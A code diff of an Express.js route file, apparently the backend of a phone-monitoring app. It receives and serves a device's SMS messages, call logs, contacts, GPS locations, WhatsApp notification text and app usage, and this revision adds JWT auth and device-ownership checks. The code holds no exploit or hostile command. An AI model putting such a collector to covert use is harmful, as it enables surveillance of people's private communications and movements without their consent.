@@ -1,202 +1,238 @@
+// routes/data.js
 const express = require('express');
+const router = express.Router();
+const auth = require('../middleware/auth'); // middleware JWT
+const Device = require('../models/Device');
+
 const Sms = require('../models/Sms');
 const Call = require('../models/Call');
-const Contact = require('../models/Contact');
 const Location = require('../models/Location');
-const Device = require('../models/Device');
 const AppUsage = require('../models/AppUsage');
+const ContactBatch = require('../models/ContactBatch');
 const Notification = require('../models/Notification');
 
-const router = express.Router();
-const { requireUser } = require('../middleware/auth');
-
-// helper: require device to exist and be associated to a user
-async function requireRegisteredDevice(deviceId) {
-  if (!deviceId) throw { status: 400, message: 'deviceId required' };
-  const dev = await Device.findOne({ deviceId });
-  if (!dev) throw { status: 403, message: 'device not registered' };
-  if (!dev.user) throw { status: 403, message: 'device not associated to user' };
-  return dev;
+/**
+ * Helper: valida deviceId e owner (req.user)
+ * Retorna device doc ou lança erro com status e mensagem.
+ */
+async function ensureDeviceBelongsToUser(deviceId, user) {
+  if (!deviceId) {
+    const err = new Error('deviceId required');
+    err.status = 400;
+    throw err;
+  }
+  const device = await Device.findOne({ deviceId });
+  if (!device) {
+    const err = new Error('device not found');
+    err.status = 404;
+    throw err;
+  }
+  if (!device.owner || device.owner.toString() !== user._id.toString()) {
+    const err = new Error('device not associated to user');
+    err.status = 403;
+    throw err;
+  }
+  return device;
 }
 
-// POST /api/sms
-router.post('/sms', async (req, res) => {
+/* ------------------------------
+   POST endpoints: receive data
+   ------------------------------ */
+
+// POST /api/data/sms
+router.post('/sms', auth, async (req, res) => {
   try {
     const { deviceId, sender, message, timestamp } = req.body;
-    const dev = await requireRegisteredDevice(deviceId);
+    await ensureDeviceBelongsToUser(deviceId, req.user);
     const doc = new Sms({
       deviceId,
-      user: dev.user,
-      sender, message, timestamp: timestamp ? new Date(timestamp) : new Date()
-    });
-    await doc.save();
-    res.json({ ok: true });
-  } catch (e) {
-    console.error('sms err', e);
-    const status = e.status || 500;
-    return res.status(status).json({ error: e.message || 'server error' });
-  }
-});
-
-// POST /api/call
-router.post('/call', async (req, res) => {
-  try {
-    const { deviceId, number, type, state, timestamp, duration } = req.body;
-    const dev = await requireRegisteredDevice(deviceId);
-    const doc = new Call({
-      deviceId,
-      user: dev.user,
-      number, type, state, timestamp: timestamp ? new Date(timestamp) : new Date(),
-      duration: duration || 0
-    });
-    await doc.save();
-    res.json({ ok: true, id: doc._id });
-  } catch (e) {
-    console.error('call err', e);
-    const status = e.status || 500;
-    return res.status(status).json({ error: e.message || 'server error' });
-  }
-});
-
-// POST /api/contacts (bulk)
-router.post('/contacts', async (req, res) => {
-  try {
-    const { deviceId, contacts } = req.body;
-    const dev = await requireRegisteredDevice(deviceId);
-    if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be array' });
-    const userId = dev.user;
-    const docs = contacts.map(c => ({ deviceId, user: userId, name: c.name || '', number: c.number || '' }));
-    await Contact.insertMany(docs);
-    res.json({ ok: true, inserted: docs.length });
-  } catch (e) {
-    console.error('contacts err', e);
-    const status = e.status || 500;
-    return res.status(status).json({ error: e.message || 'server error' });
-  }
-});
-
-// POST /api/location
-router.post('/location', async (req, res) => {
-  try {
-    const { deviceId, lat, lon, accuracy, timestamp } = req.body;
-    const dev = await requireRegisteredDevice(deviceId);
-    const doc = new Location({
-      deviceId,
-      user: dev.user,
-      lat, lon, accuracy: accuracy || 0, timestamp: timestamp ? new Date(timestamp) : new Date()
-    });
-    await doc.save();
-
-    // emit socket to user
-    const io = req.app.locals.io;
-    if (io && doc.user) {
-      io.to(`user:${String(doc.user)}`).emit('location:new', {
-        _id: doc._id, deviceId: doc.deviceId, lat: doc.lat, lon: doc.lon, accuracy: doc.accuracy, timestamp: doc.timestamp
-      });
-    }
-
-    res.json({ ok: true });
-  } catch (e) {
-    console.error('location err', e);
-    const status = e.status || 500;
-    return res.status(status).json({ error: e.message || 'server error' });
-  }
-});
-
-// POST /api/app-usage
-router.post('/app-usage', async (req, res) => {
-  try {
-    const { deviceId, packageName, totalTime, lastTimeUsed } = req.body;
-    const dev = await requireRegisteredDevice(deviceId);
-    const doc = new AppUsage({
-      deviceId,
-      user: dev.user,
-      packageName, totalTime, lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date()
-    });
-    await doc.save();
-    res.json({ ok: true });
-  } catch (e) {
-    console.error('app-usage err', e);
-    const status = e.status || 500;
-    return res.status(status).json({ error: e.message || 'server error' });
-  }
-});
-
-// POST /api/whatsapp (notifications)
-router.post('/whatsapp', async (req, res) => {
-  try {
-    const { deviceId, message, timestamp, packageName, title } = req.body;
-    const dev = await requireRegisteredDevice(deviceId);
-    const note = new Notification({
-      deviceId,
-      user: dev.user,
-      packageName: packageName || 'unknown',
-      title: title || '',
+      user: req.user._id,
+      sender: sender || null,
       message: message || '',
       timestamp: timestamp ? new Date(timestamp) : new Date()
     });
-    await note.save();
-
-    const io = req.app.locals.io;
-    if (io && note.user) {
-      io.to(`user:${String(note.user)}`).emit('notification:new', {
-        _id: note._id, packageName: note.packageName, message: note.message, timestamp: note.timestamp, title: note.title
-      });
-    }
-
-    res.json({ ok: true });
-  } catch (e) {
-    console.error('whatsapp err', e);
-    const status = e.status || 500;
-    return res.status(status).json({ error: e.message || 'server error' });
+    await doc.save();
+    return res.json({ ok: true, id: doc._id });
+  } catch (err) {
+    console.error('POST /data/sms error', err);
+    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
   }
 });
 
-/* ---------------------------
-   GET endpoints (protected)
-   --------------------------- */
-
-const SmsModel = require('../models/Sms');
-const CallModel = require('../models/Call');
-const ContactModel = require('../models/Contact');
-const LocationModel = require('../models/Location');
-const MediaModel = require('../models/Media');
-const AppUsageModel = require('../models/AppUsage');
-const NotificationModel = require('../models/Notification');
-
-router.get('/sms', requireUser, async (req, res) => {
-  const docs = await SmsModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
-  res.json(docs);
+// POST /api/data/call
+router.post('/call', auth, async (req, res) => {
+  try {
+    const { deviceId, number, type, state, timestamp, duration } = req.body;
+    await ensureDeviceBelongsToUser(deviceId, req.user);
+    const doc = new Call({
+      deviceId,
+      user: req.user._id,
+      number: number || null,
+      type: type || null,
+      state: state || null,
+      timestamp: timestamp ? new Date(timestamp) : new Date(),
+      duration: typeof duration === 'number' ? duration : 0
+    });
+    await doc.save();
+    return res.json({ ok: true, id: doc._id });
+  } catch (err) {
+    console.error('POST /data/call error', err);
+    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
+  }
 });
 
-router.get('/call', requireUser, async (req, res) => {
-  const docs = await CallModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
-  res.json(docs);
+// POST /api/data/location
+router.post('/location', auth, async (req, res) => {
+  try {
+    const { deviceId, lat, lon, accuracy, timestamp } = req.body;
+    await ensureDeviceBelongsToUser(deviceId, req.user);
+    const doc = new Location({
+      deviceId,
+      user: req.user._id,
+      lat: Number(lat),
+      lon: Number(lon),
+      accuracy: typeof accuracy === 'number' ? accuracy : (accuracy ? Number(accuracy) : null),
+      timestamp: timestamp ? new Date(timestamp) : new Date()
+    });
+    await doc.save();
+    return res.json({ ok: true, id: doc._id });
+  } catch (err) {
+    console.error('POST /data/location error', err);
+    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
+  }
 });
 
-router.get('/contacts', requireUser, async (req, res) => {
-  const docs = await ContactModel.find({ user: req.user.id }).sort({ name: 1 }).limit(5000).lean();
-  res.json(docs);
+// POST /api/data/whatsapp (notifications)
+router.post('/whatsapp', auth, async (req, res) => {
+  try {
+    const { deviceId, message, timestamp, packageName } = req.body;
+    await ensureDeviceBelongsToUser(deviceId, req.user);
+    const doc = new Notification({
+      deviceId,
+      user: req.user._id,
+      packageName: packageName || 'com.whatsapp',
+      message: message || '',
+      timestamp: timestamp ? new Date(timestamp) : new Date()
+    });
+    await doc.save();
+    return res.json({ ok: true, id: doc._id });
+  } catch (err) {
+    console.error('POST /data/whatsapp error', err);
+    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
+  }
 });
 
-router.get('/location', requireUser, async (req, res) => {
-  const docs = await LocationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(1000).lean();
-  res.json(docs);
+// POST /api/data/app-usage
+router.post('/app-usage', auth, async (req, res) => {
+  try {
+    const { deviceId, packageName, totalTime, lastTimeUsed } = req.body;
+    await ensureDeviceBelongsToUser(deviceId, req.user);
+    const doc = new AppUsage({
+      deviceId,
+      user: req.user._id,
+      packageName: packageName || '',
+      totalTime: Number(totalTime) || 0,
+      lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date()
+    });
+    await doc.save();
+    return res.json({ ok: true, id: doc._id });
+  } catch (err) {
+    console.error('POST /data/app-usage error', err);
+    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
+  }
 });
 
-router.get('/whatsapp', requireUser, async (req, res) => {
-  const docs = await NotificationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
-  res.json(docs);
+// POST /api/data/contacts  (contactsArray in body)
+router.post('/contacts', auth, async (req, res) => {
+  try {
+    const { deviceId, contacts } = req.body;
+    if (!Array.isArray(contacts)) {
+      return res.status(400).json({ error: 'contacts must be array' });
+    }
+    await ensureDeviceBelongsToUser(deviceId, req.user);
+    // Save batch as a document (timestamped snapshot)
+    const doc = new ContactBatch({
+      deviceId,
+      user: req.user._id,
+      contacts,
+      timestamp: new Date()
+    });
+    await doc.save();
+    return res.json({ ok: true, id: doc._id });
+  } catch (err) {
+    console.error('POST /data/contacts error', err);
+    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
+  }
 });
 
-router.get('/app-usage', requireUser, async (req, res) => {
-  const docs = await AppUsageModel.find({ user: req.user.id }).sort({ createdAt: -1 }).limit(500).lean();
-  res.json(docs);
+/* ------------------------------
+   GET endpoints: fetch data for the authenticated user's devices
+   ------------------------------ */
+
+// GET /api/data/sms
+router.get('/sms', auth, async (req, res) => {
+  try {
+    const docs = await Sms.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(200).lean();
+    return res.json(docs);
+  } catch (err) {
+    console.error('GET /data/sms error', err);
+    return res.status(500).json({ error: 'server_error' });
+  }
 });
 
-router.get('/media', requireUser, async (req, res) => {
-  const docs = await MediaModel.find({ user: req.user.id }).sort({ uploadDate: -1 }).limit(500).lean();
-  res.json(docs);
+// GET /api/data/call
+router.get('/call', auth, async (req, res) => {
+  try {
+    const docs = await Call.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(200).lean();
+    return res.json(docs);
+  } catch (err) {
+    console.error('GET /data/call error', err);
+    return res.status(500).json({ error: 'server_error' });
+  }
+});
+
+// GET /api/data/location
+router.get('/location', auth, async (req, res) => {
+  try {
+    const docs = await Location.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(500).lean();
+    return res.json(docs);
+  } catch (err) {
+    console.error('GET /data/location error', err);
+    return res.status(500).json({ error: 'server_error' });
+  }
+});
+
+// GET /api/data/app-usage
+router.get('/app-usage', auth, async (req, res) => {
+  try {
+    const docs = await AppUsage.find({ user: req.user._id }).sort({ lastTimeUsed: -1 }).limit(500).lean();
+    return res.json(docs);
+  } catch (err) {
+    console.error('GET /data/app-usage error', err);
+    return res.status(500).json({ error: 'server_error' });
+  }
+});
+
+// GET /api/data/contacts  -> returns latest contact batches
+router.get('/contacts', auth, async (req, res) => {
+  try {
+    const docs = await ContactBatch.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(20).lean();
+    return res.json(docs);
+  } catch (err) {
+    console.error('GET /data/contacts error', err);
+    return res.status(500).json({ error: 'server_error' });
+  }
+});
+
+// GET /api/data/notifications
+router.get('/notifications', auth, async (req, res) => {
+  try {
+    const docs = await Notification.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(200).lean();
+    return res.json(docs);
+  } catch (err) {
+    console.error('GET /data/notifications error', err);
+    return res.status(500).json({ error: 'server_error' });
+  }
 });
 
 module.exports = router;
